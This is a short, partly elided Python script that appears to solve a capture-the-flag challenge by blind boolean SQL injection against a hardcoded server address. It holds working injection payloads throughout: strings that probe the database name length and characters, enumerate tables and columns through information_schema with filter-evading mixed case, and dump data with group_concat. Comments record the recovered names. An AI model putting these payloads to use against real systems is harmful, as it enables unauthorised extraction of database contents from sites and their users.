...
import re
url = 'http://101.132.112.252:31891/404.php'
flag_success = 'admin'

payload1_database_length = '-1\' or length(database())={}#'
payload_database = '-1\' or ord(substr(database(),{},1))>{}#'
payload_data = '-1\' or if(ord(SUBSTR((seLEct group_concat({}) from {}),{},1))>{},1,0)#'
# payload_database = ' or if(ascii(substr(database(),{},1))>{},1,2)'
...
payload_column = '-1\' or if(ord(SUBSTR((selEct group_cOncat(column_name) from information_schema.columns where table_name="{}"),{},1))>{},1,0) #'
...
if __name__ == '__main__':
    ...
    # go('database', payload_database)  # 'ctf'
    # go('table', payload_table)  # 'loflag'
    # go('column', payload_column.format(table_name, '{}', '{}'))  # name,number,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
